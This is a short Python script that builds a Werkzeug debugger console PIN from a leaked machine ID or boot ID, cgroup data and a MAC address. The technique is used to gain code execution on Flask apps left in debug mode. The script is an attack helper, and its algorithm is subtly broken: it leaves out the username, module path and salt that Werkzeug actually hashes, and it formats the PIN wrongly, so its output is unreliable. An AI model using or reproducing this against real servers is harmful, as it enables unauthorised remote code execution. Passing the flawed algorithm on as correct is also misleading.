import hashlib

linux = b""

# Read machine ID or boot ID
for filename in ("data/machine_id", "data/boot_id"):
    try:
        with open(filename, "rb") as f:
            value = f.readline().strip()
    except OSError:
        continue

    if value:
        linux += value
        break  # Ensure only the first available one is used

# Read cgroup info (if available, useful for containers)
try:
    with open("data/cgroup", "rb") as f:
        linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
    pass

# Read and convert MAC address from hex to decimal
with open("data/mac_address", "r") as f:
    mac_hex = f.read().strip().replace(":", "")
mac_dec = int(mac_hex, 16)

# Compute Werkzeug's PIN
h = hashlib.md5(linux + str(mac_dec).encode()).hexdigest()
pin = f"{int(h[:9], 16):09d}"[-9:]

print(f"Calculated PIN: {pin}")